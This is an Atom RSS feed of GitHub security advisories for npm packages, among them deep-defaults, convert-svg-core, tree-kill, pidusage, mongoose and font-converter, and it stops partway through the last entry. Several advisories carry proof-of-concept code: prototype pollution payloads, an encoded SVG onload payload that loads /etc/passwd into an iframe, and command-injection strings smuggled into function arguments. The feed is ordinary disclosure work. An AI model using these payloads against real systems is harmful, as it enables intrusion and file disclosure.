<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2024-04-23T14:01:23.859Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[gitbook] GitBook allows Cross-site Scripting via a local .md file.]]></title>
        <id>https://github.com/advisories/GHSA-hwgp-c653-6684</id>
        <link href="https://github.com/advisories/GHSA-hwgp-c653-6684"/>
        <updated>2024-04-22T23:23:18.000Z</updated>
        <content type="html"><![CDATA[<p>GitBook through 2.6.9 allows Cross-site Scripting via javascript inclusion in a local .md file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-19596">https://nvd.nist.gov/vuln/detail/CVE-2019-19596</a></li>
<li><a href="https://github.com/ianxtianxt/gitbook-xss">https://github.com/ianxtianxt/gitbook-xss</a></li>
<li><a href="https://github.com/advisories/GHSA-hwgp-c653-6684">https://github.com/advisories/GHSA-hwgp-c653-6684</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hwgp-c653-6684</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T17:02:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deep-defaults] deep-defaults vulnerable to prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-h6xg-rg33-9mf4</id>
        <link href="https://github.com/advisories/GHSA-h6xg-rg33-9mf4"/>
        <updated>2024-04-22T23:22:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="overview">Overview</h3>
<p>Prototype pollution vulnerability in 'deep-defaults' versions 1.0.0 through 1.0.5 allows attacker to cause a denial of service and may lead to remote code execution.</p>
<h3 id="details">Details</h3>
<p>The NPM module <code>deep-defaults</code> can be abused by Prototype Pollution vulnerability since the function <code>_deepDefaults()</code> does not check for the type of object before assigning value to the property. Due to this flaw an attacker could create a non-existent property or able to manipulate the property which leads to Denial of Service or potentially Remote code execution.</p>
<h3 id="poc">PoC</h3>
<p>The <code>_deepDefaults ()</code> function accepts <code>dest</code>, <code>src</code> as arguments. Due to the absence of validation on the values passed into the <code>src</code> argument, an attacker can supply a malicious value by adjusting the value to include the <code>__proto__</code> property. Since there is no validation before assigning the property to check whether the assigned argument is the Object's own property or not, the property <code>polluted</code> will be directly be assigned to the new object thereby polluting the Object prototype. Later in the code, if there is a check to validate <code>polluted</code> the valued would be substituted as "Yes! Its Polluted" as it had been polluted.</p>
<pre><code class="language-js">var deepDefaults = require("deep-defaults")
var malicious_payload = '{"__proto__":{"polluted":"Yes! Its Polluted"}}';
var obj ={};
console.log("Before : " + {}.polluted);
deepDefaults(obj, JSON.parse(malicious_payload));
console.log("After : " + {}.polluted);
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-25944">https://nvd.nist.gov/vuln/detail/CVE-2021-25944</a></li>
<li><a href="https://github.com/d5/deep-defaults/blob/321d0e2231aa807d54e7f95d75c22048a806923f/lib/index.js#L16">https://github.com/d5/deep-defaults/blob/321d0e2231aa807d54e7f95d75c22048a806923f/lib/index.js#L16</a></li>
<li><a href="https://web.archive.org/web/20210525211925/https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25944">https://web.archive.org/web/20210525211925/https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25944</a></li>
<li><a href="https://github.com/advisories/GHSA-h6xg-rg33-9mf4">https://github.com/advisories/GHSA-h6xg-rg33-9mf4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h6xg-rg33-9mf4</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-24T19:03:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[obsidian] Obsidian does not require user confirmation for non-http/https URLs.]]></title>
        <id>https://github.com/advisories/GHSA-45mx-g85m-wwm3</id>
        <link href="https://github.com/advisories/GHSA-45mx-g85m-wwm3"/>
        <updated>2024-04-22T23:22:17.000Z</updated>
        <content type="html"><![CDATA[<p>Obsidian before 0.12.12 does not require user confirmation for non-http/https URLs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-38148">https://nvd.nist.gov/vuln/detail/CVE-2021-38148</a></li>
<li><a href="https://web.archive.org/web/20210807011714/https://forum.obsidian.md/t/obsidian-release-v0-12-12/21564">https://web.archive.org/web/20210807011714/https://forum.obsidian.md/t/obsidian-release-v0-12-12/21564</a></li>
<li><a href="https://github.com/advisories/GHSA-45mx-g85m-wwm3">https://github.com/advisories/GHSA-45mx-g85m-wwm3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-45mx-g85m-wwm3</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-24T19:10:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[convert-svg-core] convert-svg-core vulnerable to remote code injection]]></title>
        <id>https://github.com/advisories/GHSA-5gxc-fxcr-9326</id>
        <link href="https://github.com/advisories/GHSA-5gxc-fxcr-9326"/>
        <updated>2024-04-22T23:21:56.000Z</updated>
        <content type="html"><![CDATA[<p>The package convert-svg-core before 0.6.2 is vulnerable to Remote Code Injection via sending an SVG file containing the payload in an <code>onload</code> attribute. Puppeteer/Chromium (used by convert-svg-core) will execute any code within that tag, including malicious code.</p>
<h3 id="poc">PoC</h3>
<p><strong>Payload</strong></p>
<pre><code class="language-html">&lt;svg onload=eval(atob(this.id)) id='ZG9jdW1lbnQud3JpdGUoJzxzdmctZHVtbXk+PC9zdmctZHVtbXk+PGlmcmFtZSBzcmM9ImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwMHB4Ij48L2lmcmFtZT48c3ZnIHZpZXdCb3g9IjAgMCAyNDAgODAiIGhlaWdodD0iMTAwMCIgd2lkdGg9IjEwMDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRleHQgeD0iMCIgeT0iMCIgY2xhc3M9IlJycnJyIiBpZD0iZGVtbyI+ZGF0YTwvdGV4dD48L3N2Zz4nKTs='&gt;&lt;/svg&gt;
</code></pre>
<p>where the <code>id</code> attribute is the base 64-encoded form of </p>
<pre><code class="language-js">document.write('&lt;svg-dummy&gt;&lt;/svg-dummy&gt;&lt;iframe src="file:///etc/passwd" width="100%" height="1000px"&gt;&lt;/iframe&gt;&lt;svg viewBox="0 0 240 80" height="1000" width="1000" xmlns="http://www.w3.org/2000/svg"&gt;&lt;text x="0" y="0" class="Rrrrr" id="demo"&gt;data&lt;/text&gt;&lt;/svg&gt;');
</code></pre>
<p><strong>Attack</strong></p>
<pre><code class="language-js">const { convert } = require('convert-svg-to-png');
const express = require('express');
const fileSvg = `[[[payload]]]`;
// YWxlcnQoMSk=
// function newContent(){document.open(),document.write('&lt;text x=\"0\" y=\"0\" class=\"Rrrrr\" id=\"demo\"&gt;data&lt;/text&gt;'),document.close()}
const app = express();
app.get('/poc', async (req, res)=&gt;{
  try {
    const png = await convert(fileSvg);
    res.set('Content-Type', 'image/png');
    res.send(png);
  } catch (e) {
      console.log(e);
    res.send("");
  }
});
app.listen(3000, ()=&gt;{
  console.log('started');
});
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-25759">https://nvd.nist.gov/vuln/detail/CVE-2022-25759</a></li>
<li><a href="https://github.com/neocotic/convert-svg/issues/81">https://github.com/neocotic/convert-svg/issues/81</a></li>
<li><a href="https://github.com/neocotic/convert-svg/pull/82">https://github.com/neocotic/convert-svg/pull/82</a></li>
<li><a href="https://github.com/neocotic/convert-svg/commit/7e6031ac7427cf82cf312cb4a25040f2e6efe7a5">https://github.com/neocotic/convert-svg/commit/7e6031ac7427cf82cf312cb4a25040f2e6efe7a5</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-2849633">https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-2849633</a></li>
<li><a href="https://github.com/advisories/GHSA-5gxc-fxcr-9326">https://github.com/advisories/GHSA-5gxc-fxcr-9326</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5gxc-fxcr-9326</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-07-23T00:00:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[browserify-shim] thlorenz browserify-shim vulnerable to prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-866w-wm4h-95c6</id>
        <link href="https://github.com/advisories/GHSA-866w-wm4h-95c6"/>
        <updated>2024-04-22T23:21:00.000Z</updated>
        <content type="html"><![CDATA[<p>Prototype pollution vulnerability in function <code>resolveShims</code> in resolve-shims.js in thlorenz browserify-shim 3.8.15 via the <code>k</code> variable in resolve-shims.js.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-37617">https://nvd.nist.gov/vuln/detail/CVE-2022-37617</a></li>
<li><a href="https://github.com/thlorenz/browserify-shim/issues/245">https://github.com/thlorenz/browserify-shim/issues/245</a></li>
<li><a href="https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L130">https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L130</a></li>
<li><a href="https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L158">https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L158</a></li>
<li><a href="https://github.com/thlorenz/browserify-shim/pull/246">https://github.com/thlorenz/browserify-shim/pull/246</a></li>
<li><a href="https://github.com/thlorenz/browserify-shim/commit/97855e622b6dcd117c77e6583701962ff45e7338">https://github.com/thlorenz/browserify-shim/commit/97855e622b6dcd117c77e6583701962ff45e7338</a></li>
<li><a href="https://github.com/advisories/GHSA-866w-wm4h-95c6">https://github.com/advisories/GHSA-866w-wm4h-95c6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-866w-wm4h-95c6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-10-12T12:00:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[browserify-shim] thlorenz browserify-shim vulnerable to prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-r737-347m-wqc7</id>
        <link href="https://github.com/advisories/GHSA-r737-347m-wqc7"/>
        <updated>2024-04-22T23:20:56.000Z</updated>
        <content type="html"><![CDATA[<p>Prototype pollution vulnerability in function resolveShims in resolve-shims.js in thlorenz browserify-shim 3.8.15 via the fullPath variable in resolve-shims.js.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-37621">https://nvd.nist.gov/vuln/detail/CVE-2022-37621</a></li>
<li><a href="https://github.com/thlorenz/browserify-shim/issues/247">https://github.com/thlorenz/browserify-shim/issues/247</a></li>
<li><a href="https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L158">https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L158</a></li>
<li><a href="https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L37">https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L37</a></li>
<li><a href="https://github.com/thlorenz/browserify-shim/pull/246">https://github.com/thlorenz/browserify-shim/pull/246</a></li>
<li><a href="https://github.com/thlorenz/browserify-shim/commit/97855e622b6dcd117c77e6583701962ff45e7338">https://github.com/thlorenz/browserify-shim/commit/97855e622b6dcd117c77e6583701962ff45e7338</a></li>
<li><a href="https://github.com/advisories/GHSA-r737-347m-wqc7">https://github.com/advisories/GHSA-r737-347m-wqc7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r737-347m-wqc7</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-10-29T12:00:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[browserify-shim] thlorenz browserify-shim vulnerable to prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-cfgr-75jx-h88g</id>
        <link href="https://github.com/advisories/GHSA-cfgr-75jx-h88g"/>
        <updated>2024-04-22T23:20:55.000Z</updated>
        <content type="html"><![CDATA[<p>Prototype pollution vulnerability in function resolveShims in resolve-shims.js in thlorenz browserify-shim 3.8.15 via the shimPath variable in resolve-shims.js.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-37623">https://nvd.nist.gov/vuln/detail/CVE-2022-37623</a></li>
<li><a href="https://github.com/thlorenz/browserify-shim/issues/248">https://github.com/thlorenz/browserify-shim/issues/248</a></li>
<li><a href="https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L158">https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L158</a></li>
<li><a href="https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L94">https://github.com/thlorenz/browserify-shim/blob/464b32bbe142664cd9796059798f6c738ea3de8f/lib/resolve-shims.js#L94</a></li>
<li><a href="https://github.com/thlorenz/browserify-shim/pull/246">https://github.com/thlorenz/browserify-shim/pull/246</a></li>
<li><a href="https://github.com/thlorenz/browserify-shim/commit/97855e622b6dcd117c77e6583701962ff45e7338">https://github.com/thlorenz/browserify-shim/commit/97855e622b6dcd117c77e6583701962ff45e7338</a></li>
<li><a href="https://github.com/advisories/GHSA-cfgr-75jx-h88g">https://github.com/advisories/GHSA-cfgr-75jx-h88g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cfgr-75jx-h88g</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-10-31T19:00:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tree-kill] Treekill Enables OS Command Injection]]></title>
        <id>https://github.com/advisories/GHSA-j7fq-p9q7-5wfv</id>
        <link href="https://github.com/advisories/GHSA-j7fq-p9q7-5wfv"/>
        <updated>2024-04-22T23:20:00.000Z</updated>
        <content type="html"><![CDATA[<p>A Code Injection exists in treekill and tree-kill on Windows which allows a remote code execution when an attacker is able to control the input into the command.</p>
<h3 id="steps-to-reproduce">Steps To Reproduce:</h3>
<p>Create the following PoC file:</p>
<pre><code class="language-js">var kill = require('treekill');
kill('3333332 &amp; echo "HACKED" &gt; HACKED.txt &amp; ');
</code></pre>
<p>Execute the following commands in terminal:</p>
<pre><code class="language-shell">npm i treekill # Install affected module
dir # Check *HACKED.txt* doesn't exist
node poc.js #  Run the PoC
dir # Now *HACKED.txt* exists :)
</code></pre>
<p>The HACKED.txt has been created</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-15598">https://nvd.nist.gov/vuln/detail/CVE-2019-15598</a></li>
<li><a href="https://hackerone.com/reports/703415">https://hackerone.com/reports/703415</a></li>
<li><a href="https://github.com/pkrumins/node-tree-kill/issues/30">https://github.com/pkrumins/node-tree-kill/issues/30</a></li>
<li><a href="https://github.com/pkrumins/node-tree-kill/pull/31">https://github.com/pkrumins/node-tree-kill/pull/31</a></li>
<li><a href="https://github.com/pkrumins/node-tree-kill/commit/ff73dbf144c4c2daa67799a50dfff59cd455c63c">https://github.com/pkrumins/node-tree-kill/commit/ff73dbf144c4c2daa67799a50dfff59cd455c63c</a></li>
<li><a href="https://hackerone.com/reports/701183">https://hackerone.com/reports/701183</a></li>
<li><a href="https://github.com/node-modules/treekill/blob/master/index.js#L32">https://github.com/node-modules/treekill/blob/master/index.js#L32</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-TREEKILL-536781">https://security.snyk.io/vuln/SNYK-JS-TREEKILL-536781</a></li>
<li><a href="https://github.com/advisories/GHSA-j7fq-p9q7-5wfv">https://github.com/advisories/GHSA-j7fq-p9q7-5wfv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j7fq-p9q7-5wfv</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-24T17:04:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pidusage] PIDUsage Enables OS Command Injection]]></title>
        <id>https://github.com/advisories/GHSA-h2p3-h48h-9jj7</id>
        <link href="https://github.com/advisories/GHSA-h2p3-h48h-9jj7"/>
        <updated>2024-04-22T23:18:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="overview">Overview</h3>
<p>Affected versions of pidusage pass unsanitized input to <code>child_process.exec()</code>, resulting in arbitrary code execution in the <code>ps</code> method.</p>
<p>This package is vulnerable to this PoC on Darwin, SunOS, FreeBSD, and AIX.</p>
<p>Windows and Linux are not vulnerable.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<pre><code class="language-js">var pid = require('pidusage');
pid.stat('1 &amp;&amp; /usr/local/bin/python');
</code></pre>
<h3 id="remediation">Remediation</h3>
<p>Update to version 1.1.5 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-1000220">https://nvd.nist.gov/vuln/detail/CVE-2017-1000220</a></li>
<li><a href="https://web.archive.org/web/20201208183910/https://www.npmjs.com/advisories/356">https://web.archive.org/web/20201208183910/https://www.npmjs.com/advisories/356</a></li>
<li><a href="https://github.com/advisories/GHSA-h2p3-h48h-9jj7">https://github.com/advisories/GHSA-h2p3-h48h-9jj7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h2p3-h48h-9jj7</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-13T01:41:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mongoose] Mongoose Vulnerable to Prototype Pollution in Schema Object]]></title>
        <id>https://github.com/advisories/GHSA-h8hf-x3f4-xwgp</id>
        <link href="https://github.com/advisories/GHSA-h8hf-x3f4-xwgp"/>
        <updated>2024-04-22T23:17:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment.</p>
<p>Affected versions of this package are vulnerable to Prototype Pollution. The <code>Schema.path()</code> function is vulnerable to prototype pollution when setting the <code>schema</code> object. This vulnerability allows modification of the Object prototype and could be manipulated into a Denial of Service (DoS) attack.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<pre><code class="language-js">// poc.js
const mongoose = require('mongoose');
const schema = new mongoose.Schema();

malicious_payload = '__proto__.toString'

schema.path(malicious_payload, [String])

x = {}
console.log(x.toString()) // crashed (Denial of service (DoS) attack)
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can be manipulated to exploit other types of attacks, such as Denial of service (DoS), Remote Code Execution, or Property Injection.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-24304">https://nvd.nist.gov/vuln/detail/CVE-2022-24304</a></li>
<li><a href="https://github.com/Automattic/mongoose/commit/a45cfb6b0ce0067ae9794cfa80f7917e1fb3c6f8">https://github.com/Automattic/mongoose/commit/a45cfb6b0ce0067ae9794cfa80f7917e1fb3c6f8</a></li>
<li><a href="https://github.com/Automattic/mongoose/blob/51e758541763b6f14569744ced15cc23ab8b50c6/lib/schema.js#L88-L141">https://github.com/Automattic/mongoose/blob/51e758541763b6f14569744ced15cc23ab8b50c6/lib/schema.js#L88-L141</a></li>
<li><a href="https://github.com/Automattic/mongoose/issues/12085">https://github.com/Automattic/mongoose/issues/12085</a></li>
<li><a href="https://github.com/Automattic/mongoose/commit/6a197316564742c0422309e1b5fecfa4faec126e">https://github.com/Automattic/mongoose/commit/6a197316564742c0422309e1b5fecfa4faec126e</a></li>
<li><a href="https://huntr.dev/bounties/055be524-9296-4b2f-b68d-6d5b810d1ddd/">https://huntr.dev/bounties/055be524-9296-4b2f-b68d-6d5b810d1ddd/</a></li>
<li><a href="https://github.com/advisories/GHSA-h8hf-x3f4-xwgp">https://github.com/advisories/GHSA-h8hf-x3f4-xwgp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h8hf-x3f4-xwgp</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-08-27T00:00:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mongoose] Mongoose Vulnerable to Prototype Pollution in Schema Object]]></title>
        <id>https://github.com/advisories/GHSA-h8hf-x3f4-xwgp</id>
        <link href="https://github.com/advisories/GHSA-h8hf-x3f4-xwgp"/>
        <updated>2024-04-22T23:17:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment.</p>
<p>Affected versions of this package are vulnerable to Prototype Pollution. The <code>Schema.path()</code> function is vulnerable to prototype pollution when setting the <code>schema</code> object. This vulnerability allows modification of the Object prototype and could be manipulated into a Denial of Service (DoS) attack.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<pre><code class="language-js">// poc.js
const mongoose = require('mongoose');
const schema = new mongoose.Schema();

malicious_payload = '__proto__.toString'

schema.path(malicious_payload, [String])

x = {}
console.log(x.toString()) // crashed (Denial of service (DoS) attack)
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can be manipulated to exploit other types of attacks, such as Denial of service (DoS), Remote Code Execution, or Property Injection.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-24304">https://nvd.nist.gov/vuln/detail/CVE-2022-24304</a></li>
<li><a href="https://github.com/Automattic/mongoose/commit/a45cfb6b0ce0067ae9794cfa80f7917e1fb3c6f8">https://github.com/Automattic/mongoose/commit/a45cfb6b0ce0067ae9794cfa80f7917e1fb3c6f8</a></li>
<li><a href="https://github.com/Automattic/mongoose/blob/51e758541763b6f14569744ced15cc23ab8b50c6/lib/schema.js#L88-L141">https://github.com/Automattic/mongoose/blob/51e758541763b6f14569744ced15cc23ab8b50c6/lib/schema.js#L88-L141</a></li>
<li><a href="https://github.com/Automattic/mongoose/issues/12085">https://github.com/Automattic/mongoose/issues/12085</a></li>
<li><a href="https://github.com/Automattic/mongoose/commit/6a197316564742c0422309e1b5fecfa4faec126e">https://github.com/Automattic/mongoose/commit/6a197316564742c0422309e1b5fecfa4faec126e</a></li>
<li><a href="https://huntr.dev/bounties/055be524-9296-4b2f-b68d-6d5b810d1ddd/">https://huntr.dev/bounties/055be524-9296-4b2f-b68d-6d5b810d1ddd/</a></li>
<li><a href="https://github.com/advisories/GHSA-h8hf-x3f4-xwgp">https://github.com/advisories/GHSA-h8hf-x3f4-xwgp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h8hf-x3f4-xwgp</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-08-27T00:00:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[font-converter] Font-Converter Vulnerable to Arbitrary Command Injection]]></title>
        <id>https://github.com/advisories/GHSA-g2c3-vwff-m3xr</id>
        <link href="https://github.com/advisories/GHSA-g2c3-vwff-m3xr"/>
        <updated>2024-04-22T23:17:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="overview">Overview</h3>
<p>font-converter is a FontForge wrapper that allows conversion between different font formats (TTF, WOFF, OTF)</p>
<p>All versions of this package are vulnerable to Arbitrary Command Injection due to missing sanitization of input that potentially flows into the <code>child_process.exec()</code> function.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-js">var PUT = require('font-converter');
var x = "$(touch success);# ";
try {
    new PUT(x, x, x, x);
} catch (e) {
    console.log(e);
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-21165">https://nvd.nist.gov/vuln/detail/CVE-2022-21165</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-FONTCONVERTER-2976194">https://security.snyk.io/vuln/SNYK-JS-FONTCONVERTER-2976194</a></li>
<li><a href="https://github.com/zgec/node-js-font-converter/blob/master/index.js#L12">https://github.com/zgec/node-js-font-converter/blob/master/index.js#L12</a></li>
<li><a href="https://github.com/advisories/GHSA-g2c3-vwff-m3xr">https://github.com/advisories/GHSA-g2c3-vwff-m3xr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g2c3-vwff-m3xr</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-08-29T20:06:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sanitize-html] Sanitize-html Vulnerable To REDoS Attacks]]></title>
        <id>https://github.com/advisories/GHSA-cgfm-xwp7-2cvr</id>
        <link href="https://github.com/advisories/GHSA-cgfm-xwp7-2cvr"/>
        <updated>2024-04-22T23:16:47.000Z</updated>
        <content type="html"><![CDATA[<p>The package sanitize-html before 2.7.1 are vulnerable to Regular Expression Denial of Service (ReDoS) due to insecure global regular expression replacement logic of HTML comment removal.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-25887">https://nvd.nist.gov/vuln/detail/CVE-2022-25887</a></li>
<li><a href="https://github.com/apostrophecms/sanitize-html/pull/557">https://github.com/apostrophecms/sanitize-html/pull/557</a></li>
<li><a href="https://github.com/apostrophecms/sanitize-html/commit/b4682c12fd30e12e82fa2d9b766de91d7d2cd23c">https://github.com/apostrophecms/sanitize-html/commit/b4682c12fd30e12e82fa2d9b766de91d7d2cd23c</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-3008102">https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-3008102</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-SANITIZEHTML-2957526">https://security.snyk.io/vuln/SNYK-JS-SANITIZEHTML-2957526</a></li>
<li><a href="https://github.com/advisories/GHSA-cgfm-xwp7-2cvr">https://github.com/advisories/GHSA-cgfm-xwp7-2cvr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cgfm-xwp7-2cvr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-31T00:00:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gh-pages] tschaub gh-pages vulnerable to prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-8mmm-9v2q-x3f9</id>
        <link href="https://github.com/advisories/GHSA-8mmm-9v2q-x3f9"/>
        <updated>2024-04-22T23:15:26.000Z</updated>
        <content type="html"><![CDATA[<p>Prototype pollution vulnerability in tschaub gh-pages via the partial variable in util.js.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-37611">https://nvd.nist.gov/vuln/detail/CVE-2022-37611</a></li>
<li><a href="https://github.com/tschaub/gh-pages/issues/446">https://github.com/tschaub/gh-pages/issues/446</a></li>
<li><a href="https://github.com/tschaub/gh-pages/blob/e363b144defe8e555f5a54251a6f7f1297c0e3f6/lib/util.js#L11">https://github.com/tschaub/gh-pages/blob/e363b144defe8e555f5a54251a6f7f1297c0e3f6/lib/util.js#L11</a></li>
<li><a href="https://github.com/tschaub/gh-pages/blob/e363b144defe8e555f5a54251a6f7f1297c0e3f6/lib/util.js#L16">https://github.com/tschaub/gh-pages/blob/e363b144defe8e555f5a54251a6f7f1297c0e3f6/lib/util.js#L16</a></li>
<li><a href="https://github.com/tschaub/gh-pages/pull/452">https://github.com/tschaub/gh-pages/pull/452</a></li>
<li><a href="https://github.com/advisories/GHSA-8mmm-9v2q-x3f9">https://github.com/advisories/GHSA-8mmm-9v2q-x3f9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8mmm-9v2q-x3f9</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
